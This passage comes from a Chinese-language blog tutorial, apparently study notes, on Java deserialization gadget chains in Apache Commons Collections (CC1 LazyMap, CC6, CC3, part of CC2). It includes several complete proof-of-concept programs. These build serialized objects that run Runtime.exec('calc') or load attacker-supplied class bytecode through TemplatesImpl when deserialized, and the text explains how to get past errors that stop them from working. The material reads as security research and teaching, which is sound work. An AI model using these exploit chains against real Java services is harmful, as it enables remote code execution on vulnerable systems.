就是LazyMap.decorate返回的那个map变量。这时候memverValue就是我们构造好的Map了InvocationHandler handler &#x3D; (InvocationHandler) declaredConstructor.newInstance(Override.class, decorate);&#x2F;&#x2F; 构造动态代理Map proxyMap &#x3D; (Map) Proxy.newProxyInstance(Map.class.getClassLoader(), new Class[] &#123;Map.class&#125;, handler);</code></pre><p>接下来去找我们的入口点，还是在AnnotationInvocationHandler的readObject 中，由于动态代理的缘故，</p><p>只要memberValue是我们构造的动态代理，就会在执行memberValues.entrySet前，先调用invoke方法，触发我们的调用链</p><p>所以我们还需要再用AnnotationInvocationHandler对这个proxyMap进行包裹。</p><pre class="language-java" data-language="java"><code class="language-java">Object invocationHandler &#x3D;  declaredConstructor.newInstance(Override.class, proxyMap);</code></pre><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/DASCTFxCBCTF/image-20230320170157464.png" alt="image-20230320170157464"></p><p>完整的poc为</p><pre class="language-java" data-language="java"><code class="language-java">package org.LazyMapSer;import org.apache.commons.collections.Transformer;import org.apache.commons.collections.functors.ChainedTransformer;import org.apache.commons.collections.functors.ConstantTransformer;import org.apache.commons.collections.functors.InvokerTransformer;import org.apache.commons.collections.map.LazyMap;import java.io.IOException;import java.io.ObjectInputStream;import java.io.ObjectOutputStream;import java.lang.reflect.Constructor;import java.lang.reflect.InvocationHandler;import java.lang.reflect.InvocationTargetException;import java.lang.reflect.Proxy;import java.nio.file.Files;import java.nio.file.Paths;import java.util.HashMap;import java.util.Map;public class main &#123;    public static void main(String[] args) throws ClassNotFoundException, NoSuchMethodException, InvocationTargetException, InstantiationException, IllegalAccessException, IOException &#123;        HashMap&lt;Object, Object&gt; objectObjectHashMap &#x3D; new HashMap&lt;&gt;();        Transformer[] t &#x3D; new Transformer[]&#123;                new ConstantTransformer(Runtime.class),                new InvokerTransformer(&quot;getMethod&quot;, new Class[]&#123;String.class, Class[].class&#125;, new Object[]&#123;&quot;getRuntime&quot;, null&#125;),                new InvokerTransformer(&quot;invoke&quot;, new Class[]&#123;Object.class, Object[].class&#125;, new Object[]&#123;null, null&#125;),                new InvokerTransformer(&quot;exec&quot;, new Class[]&#123;String.class&#125;, new Object[]&#123;&quot;calc&quot;&#125;)        &#125;;        ChainedTransformer chainedTransformer &#x3D; new ChainedTransformer(t);        Map decorate &#x3D; LazyMap.decorate(objectObjectHashMap, chainedTransformer);&#x2F;&#x2F;        decorate.get(Runtime.class);        Class&lt;?&gt; aClass &#x3D; Class.forName(&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;);        Constructor&lt;?&gt; declaredConstructor &#x3D; aClass.getDeclaredConstructor(Class.class, Map.class);        declaredConstructor.setAccessible(true);        InvocationHandler handler &#x3D; (InvocationHandler) declaredConstructor.newInstance(Override.class, decorate);        Object proxyMap &#x3D; Proxy.newProxyInstance(Map.class.getClassLoader(), new Class[] &#123;Map.class&#125;, handler);        Object invocationHandler &#x3D;  declaredConstructor.newInstance(Override.class, proxyMap);        ser(invocationHandler);        unser();    &#125;    public static void ser(Object obj) throws IOException &#123;        ObjectOutputStream oos &#x3D; new ObjectOutputStream(Files.newOutputStream(Paths.get(&quot;ser.bin&quot;)));        oos.writeObject(obj);    &#125;    public static void unser() throws IOException, ClassNotFoundException &#123;        ObjectInputStream oi &#x3D; new ObjectInputStream(Files.newInputStream(Paths.get(&quot;ser.bin&quot;)));        oi.readObject();    &#125;&#125;</code></pre><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/DASCTFxCBCTF/image-20230320171427321.png" alt="image-20230320171427321"></p><h3 id="总结-1"><a href="#总结-1" class="headerlink" title="总结"></a>总结</h3><p>入口类和执行类和TransformedMap链一样没变</p><p>入口类是AnnotationinvocationHandler</p><p>执行类是InvokerTransformer </p><p>调用链是：</p><p>AnnotationinvocationHandler.readObject</p><p>​                memberValues.entrySet()</p><p>AnnotationinvocationHandler.invoke</p><p>LazyMap.get</p><p>​                ChainedTransformer.transform()</p><p>​                ConstantTransformer.transform()</p><p>InvokerTransformer.transform</p><p>使用到的工具类辅助利用链： </p><p>ConstantTransformer</p><p> ChainedTransformer</p><p> HashMap</p><p> Proxy</p><h1 id="CC6"><a href="#CC6" class="headerlink" title="CC6"></a>CC6</h1><h2 id="分析-2"><a href="#分析-2" class="headerlink" title="分析"></a>分析</h2><blockquote><p>先说一些前置知识</p><p>由于cc1的两条链都利用了AnnotationinvocationHandler中的readObject方法，导致在高版本的jdk中由于AnnotationinvocationHandler的readObject方法的修改而无法进行利用。但cc6的链并没有版本限制。</p><p>TiredMapEntry类官方的介绍是这可用于使映射条目能够在基础映射上进行更改，没太看懂，但是具体的效果是把输入的Map对象和Object对象以key=value的形式输出出来，Object对象是key。</p></blockquote><p>对LazyMap类中的get方法选择的不同的函数造成了CC1的另一条LazyMap链</p><p>在TiredMapEntry中也有一个调用get的方法，这条链被叫做CC6</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/DASCTFxCBCTF/image-20230320180756995.png" alt="image-20230320180756995"></p><p>恰好这个map和key也是在构造函数里赋值的，是我们可以控制的</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/DASCTFxCBCTF/image-20230320180837381.png" alt="image-20230320180837381"></p><p>那么假设map是LazyMap类型，key是Runtime.class，就同样可以实现调用LazyMap.get()的目的了</p><p>接下来要去找哪里调用了getValue函数</p><p>同样是在TiredMapEntry类，hashCode函数</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/DASCTFxCBCTF/image-20230320181128596.png" alt="image-20230320181128596"></p><p>可以手动调一下，前半部分和之前都一样</p><pre class="language-java" data-language="java"><code class="language-java">        HashMap&lt;Object, Object&gt; objectObjectHashMap &#x3D; new HashMap&lt;&gt;();        Transformer[] t &#x3D; new Transformer[]&#123;&#x2F;&#x2F;                new ConstantTransformer(Runtime.class),                new InvokerTransformer(&quot;getMethod&quot;, new Class[]&#123;String.class, Class[].class&#125;, new Object[]&#123;&quot;getRuntime&quot;, null&#125;),                new InvokerTransformer(&quot;invoke&quot;, new Class[]&#123;Object.class, Object[].class&#125;, new Object[]&#123;null, null&#125;),                new InvokerTransformer(&quot;exec&quot;, new Class[]&#123;String.class&#125;, new Object[]&#123;&quot;calc&quot;&#125;)        &#125;;        ChainedTransformer chainedTransformer &#x3D; new ChainedTransformer(t);        Map decorate &#x3D; LazyMap.decorate(objectObjectHashMap, chainedTransformer);        TiedMapEntry tiedMapEntry &#x3D; new TiedMapEntry(decorate, Runtime.class);        tiedMapEntry.hashCode();</code></pre><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/DASCTFxCBCTF/image-20230320181416258.png" alt="image-20230320181416258"></p><p>后面就是怎么调hashCode了，如果跟过URLDNS的应该很容易想到就是HashMap</p><p>在HashMap重写的readObject里调用了hash函数，而hash函数里就调用了hashCode方法</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/DASCTFxCBCTF/image-20230320181622385.png" alt="image-20230320181622385"></p><p>假设此时的key是tiedMapEntry，整个链子就能成功执行了</p><p>按照我们的想法，这个poc该这么构造</p><pre class="language-java" data-language="java"><code class="language-java">Transformer[] t &#x3D; new Transformer[]&#123;        new ConstantTransformer(Runtime.class),        new InvokerTransformer(&quot;getMethod&quot;, new Class[]&#123;String.class, Class[].class&#125;, new Object[]&#123;&quot;getRuntime&quot;, null&#125;),        new InvokerTransformer(&quot;invoke&quot;, new Class[]&#123;Object.class, Object[].class&#125;, new Object[]&#123;null, null&#125;),        new InvokerTransformer(&quot;exec&quot;, new Class[]&#123;String.class&#125;, new Object[]&#123;&quot;calc&quot;&#125;)&#125;;ChainedTransformer chainedTransformer &#x3D; new ChainedTransformer(t);HashMap&lt;Object, Object&gt; objectObjectHashMap &#x3D; new HashMap&lt;&gt;();objectObjectHashMap.put(&quot;sds&quot;,&quot;sss&quot;);Map decorate &#x3D; LazyMap.decorate(objectObjectHashMap, chainedTransformer);TiedMapEntry tiedMapEntry &#x3D; new TiedMapEntry(decorate,&quot;123&quot;);HashMap&lt;Object, Object&gt; hashMap &#x3D; new HashMap&lt;&gt;();hashMap.put(tiedMapEntry, &quot;123&quot;);ser(decorate);unser();</code></pre><h2 id="完善-1"><a href="#完善-1" class="headerlink" title="完善"></a>完善</h2><p>看起来链子很完美，但实际上如果真正运行不会运行成功</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/DASCTFxCBCTF/image-20230320203448437.png" alt="image-20230320203448437"></p><p>他会提示java.lang.ProcessImpl这个类不能进行序列化，为什么会出现这个类呢，原因就是hashMap.put，</p><p>put方法会调用hashCode，然后调用TiedMapEntry类里的get方法，恰好get方法里还有个put</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/DASCTFxCBCTF/image-20230320203656410.png" alt="image-20230320203656410"></p><p>而其中的value就是我们命令执行后的一个java.lang.ProcessImpl类型的值</p><p>导致执行完后decorate里的内容变为了</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/DASCTFxCBCTF/image-20230320204007239.png" alt="image-20230320204007239"></p><p>造成了无法序列化的问题</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/DASCTFxCBCTF/image-20230320204209453.png" alt="image-20230320204209453"></p><p>另外put后调用的LazyMap的get方法在map中没有这个key，也就是在decorate中没有对应的key时将这个key加入decorate，那么在反序列化时，由于decorate已经有了这个key，所以就不满足if判断，直接return了</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/DASCTFxCBCTF/image-20230320231731235.png" alt="image-20230320231731235"></p><p>解决这两个问题都很好办，因为这个键值对的key就是TiedMapEntry里我们传入的第二个参数</p><p>所以用decorate.remove(tiedMapEntry.getKey());或者decorate.clear();删了就行（如果是用删除的方法，在用idea调试的过程中不要去看tiedMapEntry属性的值，因为这样会调用tiedMapEntry类中的toString，然后再调getValue，我们前边的删除就白删了）</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/DASCTFxCBCTF/image-20230321180456163.png" alt="image-20230321180456163"></p><p>还有一个问题是如果objectObjectHashMap里有值，那么调用的HashMap里的readObject的key和value第一次就是objectObjectHashMap的key和value，第二次才会到hashMap的键值，很怪，不知道为什么。可能是因为两个HashMap对象反序列化的时候是一块调用的同一个readObject</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/DASCTFxCBCTF/image-20230320231342833.png" alt="image-20230320231342833"></p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/DASCTFxCBCTF/image-20230320214626642.png" alt="image-20230320214626642"></p><p>但如果没有值，key的值就是TiedMapEntry类型的对象</p><p>另外由于put的原因，所以在生成的时候也会调用我们的链，所以这里可以利用反射的方式去修改tiedMapEntry里的内容，让其不会执行命令。这里是修改LazyMap的内容</p><pre class="language-java" data-language="java"><code class="language-java">Class LazyMapClass &#x3D; LazyMap.class;Field factory &#x3D; LazyMapClass.getDeclaredField(&quot;factory&quot;);factory.setAccessible(true);factory.set(decorate,chainedTransformer);</code></pre><p>在put后把factory的值改为我们构造的chainedTransformer，而在LazyMap初始化时的Transformer可以随便填一个Transformer，比如new ConstantTransformer(1)。另外这样还可以让在put时调用的LazyMap的get方法里的put就会变成123=1了，不会出现java.lang.ProcessImpl类型影响反序列化</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/DASCTFxCBCTF/image-20230321180003691.png" alt="image-20230321180003691"></p><p>最终的payload为</p><pre class="language-java" data-language="java"><code class="language-java">package org;import org.apache.commons.collections.Transformer;import org.apache.commons.collections.functors.ChainedTransformer;import org.apache.commons.collections.functors.ConstantTransformer;import org.apache.commons.collections.functors.InvokerTransformer;import org.apache.commons.collections.keyvalue.TiedMapEntry;import org.apache.commons.collections.map.LazyMap;import java.io.IOException;import java.io.ObjectInputStream;import java.io.ObjectOutputStream;import java.lang.reflect.Field;import java.nio.file.Files;import java.nio.file.Paths;import java.util.HashMap;import java.util.Map;public class HashMapTest &#123;        public static void main(String[] args) throws IOException, ClassNotFoundException, NoSuchFieldException, IllegalAccessException &#123;        Transformer[] t &#x3D; new Transformer[]&#123;                new ConstantTransformer(Runtime.class),                new InvokerTransformer(&quot;getMethod&quot;, new Class[]&#123;String.class, Class[].class&#125;, new Object[]&#123;&quot;getRuntime&quot;, null&#125;),                new InvokerTransformer(&quot;invoke&quot;, new Class[]&#123;Object.class, Object[].class&#125;, new Object[]&#123;null, null&#125;),                new InvokerTransformer(&quot;exec&quot;, new Class[]&#123;String.class&#125;, new Object[]&#123;&quot;calc&quot;&#125;)        &#125;;        ChainedTransformer chainedTransformer &#x3D; new ChainedTransformer(t);        HashMap&lt;Object, Object&gt; objectObjectHashMap &#x3D; new HashMap&lt;&gt;();&#x2F;&#x2F;        objectObjectHashMap.put(&quot;111&quot;,&quot;222&quot;);        Map decorate &#x3D; LazyMap.decorate(objectObjectHashMap,new ConstantTransformer(1));        TiedMapEntry tiedMapEntry &#x3D; new TiedMapEntry(decorate,&quot;123&quot;);        HashMap&lt;Object, Object&gt; hashMap &#x3D; new HashMap&lt;&gt;();        hashMap.put(tiedMapEntry, &quot;123&quot;);        Class LazyMapClass &#x3D; LazyMap.class;        Field factory &#x3D; LazyMapClass.getDeclaredField(&quot;factory&quot;);        factory.setAccessible(true);        factory.set(decorate,chainedTransformer);&#x2F;&#x2F;        decorate.remove(tiedMapEntry.getKey());        decorate.clear();        ser(hashMap);        unser();    &#125;    public static void ser(Object obj) throws IOException &#123;        ObjectOutputStream oos &#x3D; new ObjectOutputStream(Files.newOutputStream(Paths.get(&quot;ser.bin&quot;)));        oos.writeObject(obj);    &#125;    public static void unser() throws IOException, ClassNotFoundException &#123;        ObjectInputStream oi &#x3D; new ObjectInputStream(Files.newInputStream(Paths.get(&quot;ser.bin&quot;)));        oi.readObject();    &#125;&#125;</code></pre><h2 id="总结-2"><a href="#总结-2" class="headerlink" title="总结"></a>总结</h2><p>调用链为：</p><p>HashMap -&gt; readObject</p><p>TiedMapEntry -&gt; hashCode</p><p>TiredMapEntry -&gt; getValue</p><p>LazyMap -&gt; get</p><p>​                ChainedTransformer.transform()</p><p>​                ConstantTransformer.transform()</p><p>InvokerTransformer -&gt; transform</p><h1 id="CC3"><a href="#CC3" class="headerlink" title="CC3"></a>CC3</h1><p>CC3和上面写的CC1和CC6有不小的区别，最大的区别就是原本的 CC1 链与 CC6 链是通过 <code>Runtime.exec()</code> 进行命令执行。</p><p>而在CC3里，是通过动态类加载机制来执行恶意代码</p><h2 id="动态类加载机制"><a href="#动态类加载机制" class="headerlink" title="动态类加载机制"></a>动态类加载机制</h2><p>在类加载的过程中，我们知道字节码加载过程是</p><p>loadClass -&gt; findClass -&gt; defineClass</p><p>而在<a href="https://ethe448.github.io/2023/03/16/Java/#toc-heading-14">Java | Ethe&#39;s blog (ethe448.github.io)</a>的类加载机制的部分，我们展示了一种通过ClassLoader.defineClass 字节码加载任意类的攻击方式</p><p>不过单纯的调用defineClass是不能执行类的，若要执行就必须先进行实例化</p><p>而CC3恰好就是找到了利用defineClass并进行了实例化实现的反序列化攻击</p><h2 id="TemplatesImpl类"><a href="#TemplatesImpl类" class="headerlink" title="TemplatesImpl类"></a>TemplatesImpl类</h2><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/DASCTFxCBCTF/image-20230321205745553.png" alt="image-20230321205745553"></p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/DASCTFxCBCTF/image-20230321205923522.png" alt="image-20230321205923522"></p><p>defineClass被重载了好几次，这里随便讲两个</p><p><code>name</code>为类名，<code>b</code>为字节码数组，<code>off</code>为偏移量，<code>len</code>为字节码数组的长度。</p><p>现在我们的 <code>defineClass()</code> 方法的作用域为 <code>protected</code>，我们需要找到作用域为 <code>public</code> 的类，方便我们利用。</p><p>IDEA里右键查找用法</p><p>最后会在TemplatesImpl.TransletClassLoader里的defineClass找到一个可以利用的地方，这里没有标注作用域，也就是默认的default属性，在同一个包下可以访问</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/DASCTFxCBCTF/image-20230321210813430.png" alt="image-20230321210813430"></p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/DASCTFxCBCTF/image-20230428223705676.png" alt="image-20230428223705676"></p><p>我们再找一下调用它的函数</p><p>又被defineTransletClasses调用了，但是又是个private，所以还要接着找</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/DASCTFxCBCTF/image-20230321211236734.png" alt="image-20230321211236734"></p><p>还是TemplatesImpl这个类，getTransletInstance调用了defineTransletClasses</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/DASCTFxCBCTF/image-20230321211934212.png" alt="image-20230321211934212"></p><p>这里的_class值会在defineTransletClasses里赋值为defineClass加载后的字节码，然后再借助后面的newInstance就能实现恶意类的实例化，然后执行恶意代码。但是这个还是private，所以还要去找一个public的。</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/DASCTFxCBCTF/image-20230321223945893.png" alt="image-20230321223945893"></p><p>恰好这里就有一个</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/DASCTFxCBCTF/image-20230321212359633.png" alt="image-20230321212359633"></p><p>找到这里之后我们就可以先想办法去利用我们之前找到的这些去试着动态加载类了</p><h2 id="TemplatesImpl利用"><a href="#TemplatesImpl利用" class="headerlink" title="TemplatesImpl利用"></a>TemplatesImpl利用</h2><p>理论上只要调用new TemplatesImpl()，然后调用newTransformer方法就能到达defineClass()，然后加载恶意类。但在这里面还有一些代码逻辑上的问题</p><p>首先这里遇到的问题就是在getTransletInstance方法里的两个if判断</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/DASCTFxCBCTF/image-20230321220023834.png" alt="image-20230321220023834"></p><p>要让_name不为null，还要让_class为null</p><p>这两个都是类里的私有变量，而TemplatesImpl的公共的构造函数是个空函数</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/DASCTFxCBCTF/image-20230321220203590.png" alt="image-20230321220203590"></p><p>也就是说我们只能利用反射的方式来进行赋值了</p><p>在defineTransletClasses里也有一个if判断</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/DASCTFxCBCTF/image-20230321220909684.png" alt="image-20230321220909684"></p><p>_bytecodes不能为null，不然会直接抛出异常</p><p>而且他还是我们想要执行的恶意类，一个字节的二维数组类型</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/DASCTFxCBCTF/image-20230321222119461.png" alt="image-20230321222119461"></p><p>另外这个_tfactory也不能为空，不然也会报错</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/DASCTFxCBCTF/image-20230321221000135.png" alt="image-20230321221000135"></p><p>这里我们生成一个恶意类的字节码文件</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/DASCTFxCBCTF/image-20230321222300927.png" alt="image-20230321222300927"></p><p>写完后现在的代码为</p><pre class="language-java" data-language="java"><code class="language-java">TemplatesImpl templates &#x3D; new TemplatesImpl();&#x2F;&#x2F; _name赋值不为nullField name &#x3D; templates.getClass().getDeclaredField(&quot;_name&quot;);name.setAccessible(true);name.set(templates,&quot;123&quot;);&#x2F;&#x2F; _class赋值为nullField classField &#x3D; templates.getClass().getDeclaredField(&quot;_class&quot;);classField.setAccessible(true);classField.set(templates,null);&#x2F;&#x2F;加载恶意类的字节码Field bytecodes &#x3D; templates.getClass().getDeclaredField(&quot;_bytecodes&quot;);bytecodes.setAccessible(true);byte[] code &#x3D; Files.readAllBytes(Paths.get(&quot;D:&#x2F;&#x2F;ctftools&#x2F;ctfscript&#x2F;javastudy&#x2F;CC&#x2F;src&#x2F;main&#x2F;java&#x2F;org&#x2F;cc3&#x2F;cmd.class&quot;));&#x2F;&#x2F;转为二维数组byte[][] codes &#x3D; &#123;code&#125;;&#x2F;&#x2F;_tfactory赋值bytecodes.set(templates,codes);Field tfactory &#x3D; templates.getClass().getDeclaredField(&quot;_tfactory&quot;);tfactory.setAccessible(true);tfactory.set(templates,new TransformerFactoryImpl());templates.newTransformer();</code></pre><p>但是执行后报了空指针异常</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/DASCTFxCBCTF/image-20230321222918052.png" alt="image-20230321222918052"></p><p>在TemlatesImpl的defineTransletClasses方法里，第422行</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/DASCTFxCBCTF/image-20230321223042602.png" alt="image-20230321223042602"></p><p>下个断点能看出来因为不满足if判断，进入了else中，然后又因为_auxClasses的值为空，导致的空指针异常</p><p>但是这里我们要选让程序满足if判断的方式，而不是给_auxClasses赋值，因为在下面还有一个对_transletIndex的判断（两个都改了也能弹计算器，而且感觉更简单一点</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/DASCTFxCBCTF/image-20230321224210163.png" alt="image-20230321224210163"></p><p>接下来说一下满足if判断的方式</p><p>这里superClass是我们构造的恶意类的父类，所以这个if判断就是让我们恶意类的父类的名称和这个ABSTRACT_TRANSLET一样</p><p>这个ABSTRACT_TRANSLET是个被赋值的常量</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/DASCTFxCBCTF/image-20230321224930251.png" alt="image-20230321224930251"></p><p>所以只要让我们的恶意类继承一下com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet就好了</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/DASCTFxCBCTF/image-20230321225038543.png" alt="image-20230321225038543"></p><p>改完后重新编译一下</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/DASCTFxCBCTF/image-20230321225547734.png" alt="image-20230321225547734"></p><h2 id="CC1的利用"><a href="#CC1的利用" class="headerlink" title="CC1的利用"></a>CC1的利用</h2><p>现在确定只要调用newTransformer方法就可以加载恶意类</p><p>那我们还记得在cc1里InvokerTransformer.transform可以以反射的方式去调用一些其他的方法</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/DASCTFxCBCTF/image-20230319191708721.png" alt="image-20230319191708721"></p><p>所以这里我们以反射调用newTransformer不就行了吗</p><p>这里我们改一改CC1的Transformer数组</p><pre class="language-java" data-language="java"><code class="language-java">Transformer[] t &#x3D; new Transformer[]&#123;        new ConstantTransformer(templates),        new InvokerTransformer(&quot;newTransformer&quot;, null,null)&#125;;</code></pre><p>然后前半部分用我们之前构造的，后面用CC1的就行</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/DASCTFxCBCTF/image-20230321231854359.png" alt="image-20230321231854359"></p><h2 id="CC6的利用"><a href="#CC6的利用" class="headerlink" title="CC6的利用"></a>CC6的利用</h2><p>既然CC1可以，那CC6自然也可以，改的地方也一样，其余部分不动</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/DASCTFxCBCTF/image-20230321232250015.png" alt="image-20230321232250015"></p><h2 id="CC3调用链"><a href="#CC3调用链" class="headerlink" title="CC3调用链"></a>CC3调用链</h2><p>好了，这里回到CC3</p><p>这里CC3的作者找到了一个TrAXFilter类</p><p>其中的构造函数里调用了newTransformer方法，templates也是可控的</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/DASCTFxCBCTF/image-20230321230200262.png" alt="image-20230321230200262"></p><p>但是这个TrAXFilter类没有实现Serializable接口，所以就不能进行序列化操作。但是就像Runtime也不能进行序列化操作一样，我们可以利用反射把TrAXFilter.class这个可以序列化的传过去，然后找到有函数中调用了类似于c  =（a）.getConstructor(b)；c.newInstance(d)的语句，实现触发TrAXFilter构造函数的目的。</p><p>还真就有这样一个类里调用了这种语句</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/DASCTFxCBCTF/image-20230322152401936.png" alt="image-20230322152401936"></p><p>InstantiateTransformer类的transform函数，而且恰巧这些参数我们都能控制。</p><p>所以加上这两句</p><pre class="language-java" data-language="java"><code class="language-java">InstantiateTransformer instantiateTransformer &#x3D; new InstantiateTransformer(new Class[]&#123;Templates.class&#125;, new Object[]&#123;templates&#125;);instantiateTransformer.transform(TrAXFilter.class);</code></pre><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/DASCTFxCBCTF/image-20230322153150446.png" alt="image-20230322153150446"></p><p>接下来就是找怎么去调用InstantiateTransformer的transform函数</p><p>其实还是CC1里的东西，既然CC1里可以调InvokerTransformer.transform，那也就可以调InstantiateTransformer.transform</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/DASCTFxCBCTF/image-20230322153557923.png" alt="image-20230322153557923"></p><p>调用成功</p><p>这里的Transformer[]一定要改为下面这个</p><pre class="language-none"><code class="language-none">Transformer[] t &#x3D; new Transformer[]&#123;        new ConstantTransformer(TrAXFilter.class),        new InstantiateTransformer(new Class[]&#123;Templates.class&#125;, new Object[]&#123;templates&#125;)&#125;;</code></pre><p>如果只用 new InstantiateTransformer(new Class[]{Templates.class}, new Object[]{templates})，会由于CC1的transform参数不可控不能构造成InstantiateTransformer.transform(TrAXFilter.class)，导致无法在反序列化时有实例化的TrAXFilter类</p><p>完整poc</p><pre class="language-java" data-language="java"><code class="language-java">public class cc3 &#123;    public static void main(String[] args) throws TransformerConfigurationException, NoSuchFieldException, IllegalAccessException, IOException, ClassNotFoundException, NoSuchMethodException, InvocationTargetException, InstantiationException &#123;        TemplatesImpl templates &#x3D; new TemplatesImpl();        &#x2F;&#x2F; _name赋值不为null        Field name &#x3D; templates.getClass().getDeclaredField(&quot;_name&quot;);        name.setAccessible(true);        name.set(templates,&quot;123&quot;);        &#x2F;&#x2F; _class赋值为null        Field classField &#x3D; templates.getClass().getDeclaredField(&quot;_class&quot;);        classField.setAccessible(true);        classField.set(templates,null);        &#x2F;&#x2F;加载恶意类的字节码        Field bytecodes &#x3D; templates.getClass().getDeclaredField(&quot;_bytecodes&quot;);        bytecodes.setAccessible(true);        byte[] code &#x3D; Files.readAllBytes(Paths.get(&quot;D:&#x2F;&#x2F;ctftools&#x2F;ctfscript&#x2F;javastudy&#x2F;CC&#x2F;src&#x2F;main&#x2F;java&#x2F;org&#x2F;cc3&#x2F;cmd.class&quot;));        &#x2F;&#x2F;转为二维数组        byte[][] codes &#x3D; &#123;code&#125;;        bytecodes.set(templates,codes);        &#x2F;&#x2F;_tfactory赋值        Field tfactory &#x3D; templates.getClass().getDeclaredField(&quot;_tfactory&quot;);        tfactory.setAccessible(true);        tfactory.set(templates,new TransformerFactoryImpl());InstantiateTransformer instantiateTransformer &#x3D; new InstantiateTransformer(new Class[]&#123;Templates.class&#125;, new Object[]&#123;templates&#125;);&#x2F;&#x2F;        instantiateTransformer.transform(TrAXFilter.class);        Transformer[] t &#x3D; new Transformer[]&#123;                new ConstantTransformer(TrAXFilter.class),                new InstantiateTransformer(new Class[]&#123;Templates.class&#125;, new Object[]&#123;templates&#125;)        &#125;;        ChainedTransformer chainedTransformer &#x3D; new ChainedTransformer(t);        HashMap map &#x3D; new HashMap();        map.put(&quot;value&quot;,&quot;value&quot;);        Map decorate &#x3D; TransformedMap.decorate(map, null, chainedTransformer);&#x2F;&#x2F;        &#x2F;&#x2F;创建AnnotationinvocationHandler的类对象        Class&lt;?&gt; AIH_construct &#x3D; Class.forName(&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;);        &#x2F;&#x2F;获取构造方法        Constructor&lt;?&gt; declaredConstructor &#x3D; AIH_construct.getDeclaredConstructor(Class.class, Map.class);        declaredConstructor.setAccessible(true);        Object o &#x3D; declaredConstructor.newInstance(Target.class, decorate);        ser(o);        unser();    &#125;    public static void ser(Object obj) throws IOException &#123;        ObjectOutputStream oos &#x3D; new ObjectOutputStream(Files.newOutputStream(Paths.get(&quot;ser.bin&quot;)));        oos.writeObject(obj);    &#125;    public static void unser() throws IOException, ClassNotFoundException &#123;        ObjectInputStream oi &#x3D; new ObjectInputStream(Files.newInputStream(Paths.get(&quot;ser.bin&quot;)));        oi.readObject();    &#125;&#125;</code></pre><h2 id="总结-3"><a href="#总结-3" class="headerlink" title="总结"></a>总结</h2><p>对于CC3</p><p>入口类是AnnotationinvocationHandler</p><p>执行类是TemplatesImpl</p><p>利用链是</p><p>AnnotationinvocationHandler.readObject</p><p>AbstractInputCheckedMapDecorator.setValue</p><p>Transformed.checkSetValue</p><p>ChainedTransformer.transform</p><p>ConstantTransformer.transform</p><p>InstantiateTransformer.transform</p><p>TrAXFilter</p><p>TransformerImpl.newTransformer</p><p>TransformerImpl.getTransletInstance</p><p>TransformerImpl.defineTransletClasses</p><p>TransformerImpl.defineClass</p><h1 id="CC2"><a href="#CC2" class="headerlink" title="CC2"></a>CC2</h1><h2 id="环境搭建-1"><a href="#环境搭建-1" class="headerlink" title="环境搭建"></a>环境搭建</h2><p><strong>CommonsCollections4.0</strong></p><p>因为 CommonsCollections4 除 4.0 的其他版本去掉了 InvokerTransformer 的 Serializable 继承，导致无法序列化。</p><p>4.1版本：</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/DASCTFxCBCTF/image-20230323203633151.png" alt="image-20230323203633151"></p><h2 id="调用链"><a href="#调用链" class="headerlink" title="调用链"></a>调用链</h2><p>CC2和CC1一样，最后的都是到InvokerTransformer.transform方法</p><p>所以前边这部分是一样的</p><pre class="language-java" data-language="java"><code class="language-java">Transformer[] t &#x3D; new Transformer[]&#123;        new ConstantTransformer(Runtime.class),        new InvokerTransformer(&quot;getMethod&quot;, new Class[]&#123;String.class, Class[].class&#125;, new Object[]&#123;&quot;getRuntime&quot;, null&#125;),        new InvokerTransformer(&quot;invoke&quot;, new Class[]&#123;Object.class, Object[].class&#125;, new Object[]&#123;null, null&#125;),        new InvokerTransformer(&quot;exec&quot;, new Class[]&#123;String[].class&#125;, new Object[]&#123;new 